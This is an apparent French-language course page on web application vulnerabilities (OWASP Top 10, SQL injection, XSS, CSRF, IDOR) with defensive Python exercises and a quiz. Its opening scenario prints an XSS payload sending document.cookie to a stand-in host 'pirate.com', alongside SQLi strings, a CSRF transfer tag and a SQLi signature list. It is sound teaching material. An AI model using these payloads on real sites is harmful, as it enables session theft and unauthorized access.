@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chapitre 4 — Vulnérabilités Applicatives &amp;amp; Top 10 OWASP | Cybersécurité B2</title>
+<meta name="description" content="Chapitre 4 du cours Cybersécurité B2 : Référentiel OWASP Top 10, injections SQL (SQLi) et requêtes préparées, Cross-Site Scripting (XSS Stored/Reflected/DOM), CSRF et contrôle d’accès défaillant (IDOR). Notions fondamentales, ateliers Python interactifs, QCM corrigés.">
+<link rel="canonical" href="https://revi-mu.vercel.app/Cyber%20securite%20B2/chapitres/chapitre4.html">
+<meta property="og:title" content="Chapitre 4 — Vulnérabilités Applicatives &amp;amp; Top 10 OWASP | Cybersécurité B2">
+<meta property="og:description" content="Chapitre 4 du cours Cybersécurité B2 : Référentiel OWASP Top 10, injections SQL (SQLi) et requêtes préparées, Cross-Site Scripting (XSS Stored/Reflected/DOM), CSRF et contrôle d’accès défaillant (IDOR). Notions fondamentales, ateliers Python interactifs, QCM corrigés.">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="/assets/css/tokens.css">
+<link rel="stylesheet" href="../assets/css/cours.css">
+<link rel="stylesheet" href="/assets/css/code-lab.css">
+<script src="/assets/js/theme.js"></script>
+</head>
+<body data-chapter="4">
+
+<nav class="skip-nav" aria-label="Accès rapide"><a href="#content" class="skip-link">Aller au contenu</a></nav>
+
+<nav class="Cyber securite B2nav"><div class="Cyber securite B2nav__in">
+  <a class="Cyber securite B2nav__home" href="/" title="Accueil — Tous les portails" aria-label="Accueil — Tous les portails"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-house"></use></svg> <span>Portail</span></a>
+  <span class="Cyber securite B2nav__sep" aria-hidden="true">/</span>
+  <a class="Cyber securite B2nav__brand" href="../index.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-shield"></use></svg> Cybersécurité B2</a>
+  <div class="Cyber securite B2nav__links">
+    <a href="../sommaire.html">Sommaire</a>
+    <a href="../chapitres/chapitre1.html">Ch. 1</a>
+    <a href="../chapitres/chapitre2.html">Ch. 2</a>
+    <a href="../chapitres/chapitre3.html">Ch. 3</a>
+    <a href="../chapitres/chapitre4.html" class="is-active">Ch. 4</a>
+    <a href="../chapitres/chapitre5.html">Ch. 5</a>
+    <a href="../chapitres/chapitre6.html">Ch. 6</a>
+    <a href="../chapitres/cartes.html">Cartes</a>
+    <a href="../chapitres/formules.html">Mémo</a>
+    <a href="../exercices/exercices.html">Exercices</a>
+    <a href="../atelier.html">Atelier</a>
+    <a href="../chapitres/simulateur-examen.html">Examen</a>
+  </div>
+  <div class="Cyber securite B2nav__actions">
+    <button type="button" class="theme-toggle" id="themeToggle" aria-label="Activer le mode sombre" title="Basculer le thème clair / sombre">
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+    </button>
+  </div>
+</div></nav>
+
+<main id="content" class="Cyber securite B2wrap">
+<p class="crumb"><a href="../index.html">Cybersécurité B2</a> › <a href="../sommaire.html">Sommaire</a> › Chapitre 4</p>
+
+<h1>Chapitre 4 — Vulnérabilités Applicatives &amp; Top 10 OWASP</h1>
+
+<div class="chapmeta">
+    <span class="tag">Module 4</span>
+    <span class="tag tag--time">≈ 2 h 45 de travail</span>
+    <span class="tag tag--time">Réservé B2 et plus</span>
+  </div>
+
+  <div class="box box--situation">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-play"></use></svg> Mise en situation</div>
+    <p>Lors d’un test d’intrusion (pentest) sur une plateforme de commerce électronique, l’auditeur saisit <code>admin' OR '1'='1</code> dans le formulaire de connexion et accède instantanément au tableau de bord administrateur sans mot de passe. Plus loin, il poste un commentaire contenant <code>&lt;script&gt;fetch("http://pirate.com/?c=" + document.cookie)&lt;/script&gt;</code> qui vole la session de tous les clients consultant la fiche produit. Pourquoi ces failles applicatives continuent-elles de figurer en tête du classement OWASP depuis vingt ans ? Comment éradiquer définitivement les injections et neutraliser les failles XSS à la source ? Ce module détaille l’anatomie des vulnérabilités web et leurs parades logicielles.</p>
+  </div>
+
+  <div class="box box--objectifs">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-target"></use></svg> Objectifs pédagogiques</div>
+    <p>À la fin de ce chapitre, tu seras capable de :</p>
+    <ol>
+      <li>maîtriser le classement mondial du Top 10 de l’OWASP et ses catégories maîtresses (A01 à A03) ;</li>
+      <li>analyser le mécanisme d’une injection SQL et déployer des requêtes préparées avec liaison de paramètres (Prepared Statements) ;</li>
+      <li>différencier les trois variantes de Cross-Site Scripting (XSS stockée, réfléchie et basée sur le DOM) ;</li>
+      <li>mettre en œuvre l’assainissement (sanitization), l’échappement contextuel et les drapeaux de cookies sécurisés (HttpOnly, SameSite) ;</li>
+      <li>détecter et corriger les failles de contrôle d’accès au niveau de l’objet (IDOR / Broken Access Control).</li>
+    </ol>
+  </div>
+
+<h2>1. Le Top 10 de l’OWASP : La référence mondiale de la sécurité logicielle</h2>
+
+<p>L’<strong>OWASP</strong> (Open Web Application Security Project) publie périodiquement le consensus mondial des dix risques les plus critiques pour les applications web. L’édition actuelle met en lumière les priorités suivantes :</p>
+<table class="table">
+  <thead><tr><th>Rang OWASP</th><th>Intitulé officiel</th><th>Description &amp; Impact métier</th></tr></thead>
+  <tbody>
+    <tr><td><strong>A01:2021</strong></td><td>Contrôle d’accès défaillant (Broken Access Control)</td><td>Un utilisateur régulier accède aux données d’autrui (failles IDOR, élévation de privilèges horizontale/verticale).</td></tr>
+    <tr><td><strong>A02:2021</strong></td><td>Défaillances cryptographiques (Cryptographic Failures)</td><td>Transmission en HTTP clair, stockage de mots de passe non salés, usage d’algorithmes obsolètes (MD5, DES).</td></tr>
+    <tr><td><strong>A03:2021</strong></td><td>Injection (Injections SQL, NoSQL, OS Command)</td><td>Des données fournies par l’utilisateur sont interprétées comme du code par l’interpréteur ou le moteur SQL.</td></tr>
+    <tr><td><strong>A04:2021</strong></td><td>Conception non sécurisée (Insecure Design)</td><td>Absence de modélisation des menaces et d’architecture de sécurité dès la phase de spécification.</td></tr>
+    <tr><td><strong>A05:2021</strong></td><td>Mauvaise configuration de sécurité (Security Misconfiguration)</td><td>Mots de passe par défaut conservés, messages d’erreur bavards révélant les stack traces, ports inutiles ouverts.</td></tr>
+  </tbody>
+</table>
+
+<h2>2. Injections SQL (SQLi) : Mécanisme &amp; Requêtes préparées</h2>
+
+<p>L’injection SQL se produit lorsque des entrées utilisateur sont concaténées dynamiquement dans une chaîne SQL sans aucune neutralisation préalable :</p>
+<pre><code>// CODE TRÈS VULNÉRABLE (Concaténation directe) :
+query = "SELECT * FROM users WHERE username = '" + user_input + "' AND password = '" + pass_input + "'";
+
+// Si user_input vaut : admin' OR '1'='1
+// La requête exécutée par la base devient :
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';
+// La condition '1'='1 étant toujours vraie, la base renvoie le compte admin !</code></pre>
+  <div class="box box--pitfall">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-warning"></use></svg> La seule contre-mesure absolue : Les requêtes préparées (Prepared Statements)</div>
+<p>Le filtrage manuel par liste noire (retirer les guillemets ou le mot UNION) est régulièrement contourné par les pirates. La parade absolue consiste à utiliser des <strong>requêtes préparées avec paramètres typés</strong> :</p><pre><code># CODE ROBUSTE ET SÉCURISÉ (Paramètres séparés de l’analyse syntaxique) :
+cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user_input, pass_input))</code></pre><p>Le moteur SQL compile d’abord l’arbre syntaxique de la requête, puis injecte les paramètres comme de simples littéraux texte. Même si le paramètre contient <code>' OR 1=1 --</code>, il sera recherché textuellement sans altérer la grammaire SQL.</p>
+  </div>
+
+<h2>3. Cross-Site Scripting (XSS) : Typologie &amp; Défense en profondeur</h2>
+
+<p>Le XSS consiste à injecter des scripts JavaScript malveillants dans les pages web légitimes consultées par d’autres utilisateurs :</p>
+<div class="grid grid-3">
+  <div class="card">
+    <h4 class="card-title">1. XSS Stockée (Stored XSS)</h4>
+    <p>Le script malveillant est enregistré en base de données (ex. forum, commentaire) et exécuté chez chaque visiteur.</p>
+    <p><strong>Gravité :</strong> Maximale.</p>
+  </div>
+  <div class="card">
+    <h4 class="card-title">2. XSS Réfléchie (Reflected XSS)</h4>
+    <p>La charge utile est transmise dans un paramètre d’URL et réinjectée immédiatement dans la réponse (ex. résultat de recherche).</p>
+    <p><strong>Vecteur :</strong> Liens piégés par phishing.</p>
+  </div>
+  <div class="card">
+    <h4 class="card-title">3. XSS basée sur le DOM (DOM XSS)</h4>
+    <p>La faille réside entièrement côté client : du JavaScript local lit une source non sécurisée (<code>location.hash</code>) et l’écrit dans un puits dangereux (<code>element.innerHTML</code>).</p>
+  </div>
+</div>
+  <div class="box box--info">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-info"></use></svg> Le bouclier à trois niveaux contre le XSS</div>
+<ol>
+  <li><strong>Échappement contextuel (Contextual Escaping) :</strong> Remplacer les entités HTML (<code>&amp;</code> &rarr; <code>&amp;amp;</code>, <code>&lt;</code> &rarr; <code>&amp;lt;</code>, <code>&gt;</code> &rarr; <code>&amp;gt;</code>, <code>"</code> &rarr; <code>&amp;quot;</code>, <code>'</code> &rarr; <code>&amp;#x27;</code>).</li>
+  <li><strong>Drapeaux de cookies sécurisés :</strong> Définir <code>HttpOnly</code> sur le cookie de session (le script pirate ne peut plus lire <code>document.cookie</code>) et <code>Secure</code> (transit HTTPS uniquement).</li>
+  <li><strong>Politique de sécurité de contenu (CSP) :</strong> En-tête HTTP <code>Content-Security-Policy: default-src 'self';</code> interdisant les scripts inline et domaines non autorisés.</li>
+</ol>
+  </div>
+
+<h2>4. CSRF (Cross-Site Request Forgery) &amp; Failles IDOR</h2>
+
+<p>Deux autres failles majeures du contrôle applicatif méritent une attention rigoureuse :</p>
+<div class="grid grid-2">
+  <div class="card">
+    <h4 class="card-title">Attaque CSRF (Recherche de faux ordres)</h4>
+    <p>Un site piégé pousse le navigateur de la victime authentifiée à soumettre une requête à son insu vers la banque     (le navigateur joignant automatiquement les cookies de session) :</p>
+    <p><code>&lt;img src="https://banque.fr/virement?montant=1000&amp;dest=pirate" /&gt;</code></p>
+    <p><strong>Contre-mesures :</strong> Jeton synchronisé anti-CSRF (token aléatoire non prédictible) et attribut de cookie <code>SameSite=Lax</code> ou <code>Strict</code>.</p>
+  </div>
+  <div class="card">
+    <h4 class="card-title">Faille IDOR (Broken Object Access)</h4>
+    <p>L’application utilise un identifiant direct sans vérifier les droits du porteur de la session :</p>
+    <p><code>GET /api/facture?id=1042</code></p>
+    <p>Un utilisateur remplace 1042 par 1043 et consulte les données d’une autre société.</p>
+    <p><strong>Contre-mesure :</strong> Contrôle d’habilitation métier strict au niveau de la requête SQL ou du service de domaine.</p>
+  </div>
+</div>
+
+<!-- code-labs:start -->
+  <h2>5. Exercices de code</h2>
+  <p class="lead">Ces trois exercices se font dans la page. L’éditeur du navigateur exécute votre code
+  sur un service distant, puis la validation fait tourner des tests que vous ne voyez pas :
+  réussir l’exemple affiché ne suffit donc pas, il faut traiter le cas général.</p>
+  <p>En cas d’erreur, le bouton <strong>Expliquer mon erreur</strong> interroge le tuteur : il décrit ce qui
+  s’est passé et par où chercher, sans jamais écrire de code à votre place — c’est le principe de l’exercice.</p>
+<div class="lab" data-lab
+     data-exercise="cs2-c4-e1"
+     data-language="python"
+     data-height="300"
+     data-stdin="admin' OR '1'='1">
+  <script type="text/plain" data-lab-starter>import sys
+
+saisie = sys.stdin.read().strip()
+
+# À compléter : rechercher les motifs d’injection SQL
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 1 — Détecteur de motifs d’injection SQL (SQLi)</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n1">Niveau 1 — Acquisition</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Détecteur de motifs d’injection SQL (SQLi)</p>
+    <div class="lab__brief"><p>L’injection SQL permet à un attaquant de modifier la structure d’une requête exécutée par la base de données. Votre programme analyse une chaîne de saisie utilisateur à la recherche de signatures SQLi classiques (insensible à la casse) :
+- <code>' or </code>
+- <code>' and </code>
+- <code> union select </code>
+- <code>--</code>
+- <code>/*</code>
+- <code> sleep(</code>
+- <code>'='</code>
+
+Sortie :
+- Si un motif est trouvé : <code>INJECTION SQL DETECTEE (motif: &lt;motif&gt;)</code> (afficher le premier motif trouvé dans l’ordre de la liste ci-dessus).
+- Sinon : <code>ENTREE VALIDEE</code>.</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>admin' OR '1'='1</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>INJECTION SQL DETECTEE (motif: ' or )</pre></div>
+    </div>
+    <p class="lab__note">Exemple de référence.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Lis l entrée standard avec input().strip() ou sys.stdin.</li>
+        <li>Traite les cas selon la spécification de l exercice.</li>
+        <li>Affiche le résultat exactement sous la forme attendue.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+
+<div class="lab" data-lab
+     data-exercise="cs2-c4-e2"
+     data-language="python"
+     data-height="300"
+     data-stdin="&lt;script&gt;alert(&quot;XSS &amp; Pwned&quot;);&lt;/script&gt;">
+  <script type="text/plain" data-lab-starter>import sys
+
+texte = sys.stdin.read().rstrip("\r\n")
+
+# À compléter : remplacer les 5 caractères spéciaux par leurs entités HTML
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 2 — Neutralisateur de charge utile XSS (HTML Sanitizer)</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n2">Niveau 2 — Application</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Neutralisateur de charge utile XSS (HTML Sanitizer)</p>
+    <div class="lab__brief"><p>Les failles Cross-Site Scripting (XSS) surviennent lorsqu’une application web réinjecte des données utilisateur non filtrées dans le code HTML servi au navigateur. Pour neutraliser l’exécution de scripts, les cinq caractères critiques doivent être échappés en entités HTML dans l’ordre rigoureux suivant :
+1. <code>&amp;</code> &rarr; <code>&amp;amp;</code>
+2. <code>&lt;</code> &rarr; <code>&amp;lt;</code>
+3. <code>&gt;</code> &rarr; <code>&amp;gt;</code>
+4. <code>"</code> &rarr; <code>&amp;quot;</code>
+5. <code>'</code> &rarr; <code>&amp;#x27;</code>
+
+Entrée : Une chaîne de caractères contenant potentiellement des balises ou du JavaScript.
+Sortie : La chaîne neutralisée.</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>&lt;script&gt;alert("XSS &amp; Pwned");&lt;/script&gt;</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>&amp;lt;script&amp;gt;alert(&amp;quot;XSS &amp;amp; Pwned&amp;quot;);&amp;lt;/script&amp;gt;</pre></div>
+    </div>
+    <p class="lab__note">Exemple de référence.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Lis l entrée standard avec input().strip() ou sys.stdin.</li>
+        <li>Traite les cas selon la spécification de l exercice.</li>
+        <li>Affiche le résultat exactement sous la forme attendue.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+
+<div class="lab" data-lab
+     data-exercise="cs2-c4-e3"
+     data-language="python"
+     data-height="300"
+     data-stdin="u101;client;doc42;doc42_owner_u101">
+  <script type="text/plain" data-lab-starter>import sys
+
+ligne = sys.stdin.read().strip()
+
+# À compléter : valider l’autorisation d’accès sur la ressource
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 3 — Contrôleur d’accès contre les failles IDOR (Broken Object Level Auth)</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n3">Niveau 3 — Raisonnement</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Contrôleur d’accès contre les failles IDOR (Broken Object Level Auth)</p>
+    <div class="lab__brief"><p>Une faille IDOR (Insecure Direct Object Reference) permet à un utilisateur d’accéder aux ressources privées d’autrui simplement en modifiant un identifiant dans l’URL ou la requête.
+
+Entrée : <code>user_id;user_role;requested_doc_id;owner_doc_id</code>
+Règles d’autorisation :
+1. Si <code>user_role == "admin"</code> : l’accès est accordé avec le motif <code>ACCES AUTORISE (admin override)</code>.
+2. Sinon, si <code>user_id == owner_doc_id</code> : l’utilisateur est le propriétaire légitime, accès accordé : <code>ACCES AUTORISE (proprietaire)</code>.
+3. Sinon : refus d’accès et alerte sécurité : <code>ALERTE IDOR: utilisateur &lt;user_id&gt; non autorise sur document &lt;requested_doc_id&gt; de &lt;owner_doc_id&gt;</code>.</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>u101;client;doc42;doc42_owner_u101</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>ALERTE IDOR: utilisateur u101 non autorise sur document doc42 de doc42_owner_u101</pre></div>
+    </div>
+    <p class="lab__note">Exemple de référence.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Lis l entrée standard avec input().strip() ou sys.stdin.</li>
+        <li>Traite les cas selon la spécification de l exercice.</li>
+        <li>Affiche le résultat exactement sous la forme attendue.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+  <!-- code-labs:end -->
+  <h2>6. QCM — niveau examen</h2>
+
+  <div class="qcm">
+    <div class="q">
+      <p class="q__stem">Pourquoi l’utilisation de requêtes préparées (Prepared Statements) élimine-t-elle définitivement le risque d’injection SQL ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Parce que le moteur SQL sépare rigoureusement la phase de compilation syntaxique de la transmission des données, traitant les paramètres comme de simples valeurs scalaires</button>
+        <button class="opt">Parce que les requêtes préparées chiffrent automatiquement la base de données en AES-256</button>
+        <button class="opt">Parce qu’elles refusent automatiquement toute saisie contenant le caractère espace</button>
+        <button class="opt">Parce qu’elles transfèrent l’exécution de la requête sur le navigateur du client</button>
+      </div>
+      <div class="q__exp">En séparant la grammaire SQL des données littérales, le moteur de base de données ne réévalue jamais le contenu des paramètres comme une instruction exécutable, ce qui rend l’injection impossible.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quel attribut de cookie HTTP empêche formellement un script malveillant injecté par XSS de dérober le cookie de session via document.cookie ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">HttpOnly</button>
+        <button class="opt">Secure</button>
+        <button class="opt">SameSite</button>
+        <button class="opt">Domain</button>
+      </div>
+      <div class="q__exp">L’attribut HttpOnly indique au navigateur que le cookie ne doit jamais être accessible via les APIs JavaScript du DOM (document.cookie), neutralisant ainsi le vol de session direct par XSS.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quelle variante d’attaque XSS consiste à enregistrer définitivement la charge utile malveillante dans la base de données du site visé ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">XSS Stockée (Stored XSS)</button>
+        <button class="opt">XSS Réfléchie (Reflected XSS)</button>
+        <button class="opt">XSS basée sur le DOM (DOM XSS)</button>
+        <button class="opt">XSS Aveugle (Blind XSS)</button>
+      </div>
+      <div class="q__exp">La XSS stockée (ou persistante) sauvegarde le script dans la base de données (ex. profil, commentaire) qui s’exécute ensuite automatiquement chez tous les utilisateurs qui consultent cette ressource.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Comment caractérise-t-on une vulnérabilité IDOR (Insecure Direct Object Reference) ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Le serveur autorise l’accès à un objet privé simplement en modifiant son identifiant dans la requête, sans vérifier que l’utilisateur connecté en est le propriétaire</button>
+        <button class="opt">Le serveur utilise un algorithme de hachage cassé comme MD5</button>
+        <button class="opt">Le port SSH 22 est exposé sur Internet sans mot de passe</button>
+        <button class="opt">L’application ne dispose pas de certificat SSL/TLS valide</button>
+      </div>
+      <div class="q__exp">L’IDOR survient lorsque l’application expose une référence directe à un objet interne (clé primaire en base) et omet de valider si l’identité authentifiée a le droit légitime de lire ou modifier cet objet.</div>
+    </div>
+  </div>
+
+<h2>7. Erreurs classiques — récapitulatif</h2>
+
+  <div class="box box--pitfall">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-warning"></use></svg> À reconnaître en examen</div>
+    <ul>
+      <li>Tenter de contrer les injections SQL en concevant des filtres de nettoyage artisanaux basés sur des listes noires de mots clés.</li>
+      <li>Négliger l’échappement des données en sortie sous prétexte qu’elles proviennent de la propre base de données interne du site.</li>
+      <li>Oublier l’attribut HttpOnly sur les cookies contenant des jetons de session JWT ou d’authentification.</li>
+      <li>Croire que la méthode HTTP POST protège naturellement contre les attaques CSRF (un formulaire invisible auto-soumis contourne POST facilement).</li>
+      <li>Faire confiance à un identifiant transmis par le client dans un corps JSON sans vérifier l’appartenance de la ressource dans la session serveur.</li>
+    </ul>
+  </div>
+
+<h2>8. Méthodologie de résolution</h2>
+
+  <div class="box box--method">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-compass"></use></svg> Protocole en 4 étapes pour sécuriser les formulaires et APIs contre le Top 10 OWASP</div>
+    <ol>
+      <li>Systématiser les requêtes préparées avec liaisons de paramètres typés pour chaque accès à la base de données relationnelle ou NoSQL.</li>
+      <li>Échapper contextuellement chaque variable réinjectée dans le DOM HTML selon son emplacement (HTML body, attribut, script, style).</li>
+      <li>Durcir les cookies de session : forcer systématiquement les drapeaux HttpOnly, Secure et SameSite=Lax (ou Strict).</li>
+      <li>Intégrer un contrôle d’accès systématique par politique (ex. CanAccess(user, document_id)) avant toute opération de lecture ou d’écriture.</li>
+    </ol>
+  </div>
+
+<h2>9. Révision active</h2>
+
+  <div class="box box--revision">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-pin"></use></svg> Résumé essentiel</div>
+    <ul>
+      <li>Le Top 10 OWASP classe les failles applicatives majeures, dominé par Broken Access Control et les Injections.</li>
+      <li>Les requêtes préparées neutralisent les injections SQL en dissociant la compilation de la requête des données entrantes.</li>
+      <li>Les failles XSS (stockée, réfléchie, DOM) se contrent par l’échappement HTML, la directive CSP et l’attribut de cookie HttpOnly.</li>
+      <li>Le CSRF usurpe l’action de l’utilisateur authentifié et se bloque avec des jetons anti-CSRF et SameSite.</li>
+      <li>Les failles IDOR exigent un contrôle rigoureux de l’appartenance de l’objet demandé à l’utilisateur de la session courante.</li>
+    </ul>
+    <h3>Checklist de maîtrise</h3>
+    <ul class="check">
+      <li>Je sais identifier une concaténation SQL vulnérable et la réécrire avec des requêtes préparées.</li>
+      <li>Je connais la liste exacte des 5 caractères spéciaux HTML à échapper impérativement contre le XSS (&, <, >, ", ').</li>
+      <li>Je comprends le rôle des drapeaux HttpOnly, Secure et SameSite sur les cookies.</li>
+      <li>Je sais expliquer le fonctionnement d’une attaque CSRF et le rôle du jeton de synchronisation.</li>
+      <li>Je sais concevoir une vérification de droits pour interdire les accès non autorisés de type IDOR.</li>
+    </ul>
+    <h3>Les 8 notions à connaître absolument</h3>
+    <ol>
+      <li>Référentiel OWASP Top 10</li><li>Injection SQL (SQLi In-band, Blind)</li><li>Requêtes préparées (Prepared Statements)</li><li>Cross-Site Scripting (XSS Stored, Reflected, DOM)</li><li>Échappement d’entités HTML</li><li>Attributs de cookies (HttpOnly, Secure, SameSite)</li><li>Politique de sécurité de contenu (CSP)</li><li>Cross-Site Request Forgery (CSRF)</li><li>Jetons synchronisés anti-CSRF</li><li>Insecure Direct Object Reference (IDOR)</li>
+    </ol>
+    <p><a class="btn" href="cartes.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-cards"></use></svg> Réviser avec les flashcards</a>
+       <a class="btn" href="formules.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-file"></use></svg> Mémo syntaxe</a></p>
+  </div>
+
+<h2>10. Test de maîtrise</h2>
+
+  <div class="box box--tech">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-chart"></use></svg> Comment t'auto-évaluer</div>
+    <p>Le QCM ci-dessus est un test de maîtrise. Lis ton pourcentage :</p>
+    <div class="bands">
+      <div class="bandrow bandrow--low">&lt; 50 % — Revois le principe d’une injection SQL et la différence entre XSS et CSRF.</div>
+      <div class="bandrow bandrow--mid">50–69 % — Entraîne-toi sur la réécriture en requêtes préparées et l’échappement des entités XSS.</div>
+      <div class="bandrow bandrow--good">70–89 % — Solide : tu maîtrises les vulnérabilités du Top 10 OWASP et leurs mécanismes de défense.</div>
+      <div class="bandrow bandrow--top">≥ 95 % — Excellent : passe à l’authentification avancée, aux JWT et au contrôle RBAC au module 5.</div>
+    </div>
+    <p style="margin-top:12px"><label class="checkbox"><input type="checkbox" data-mark-done> <span>Je considère ce chapitre maîtrisé (≥ 95 % au test de maîtrise).</span></label></p>
+  </div>
+
+  <div class="chnav">
+    <a class="btn" href="../sommaire.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-arrow-left"></use></svg> Sommaire</a>
+    <a class="btn btn--primary" href="chapitre5.html">Chapitre 5 — Authentification, Gestion des Identités &amp; Contrôle d’Accès <svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-arrow-right"></use></svg></a>
+  </div>
+
+  <p class="disclaimer">Objectif de maîtrise 19/20 — ta note réelle dépend aussi de ton travail.
+  Sources : le cours de Cybersécurité B2, les guides de l’ANSSI, les référentiels du NIST (SP 800-61), de l’OWASP et les documentations Snort et Nmap.</p>
+</main>
+
+<script src="../assets/js/cours.js"></script>
+<script src="/assets/js/code-lab.js" defer></script>
+</body>
+</html>
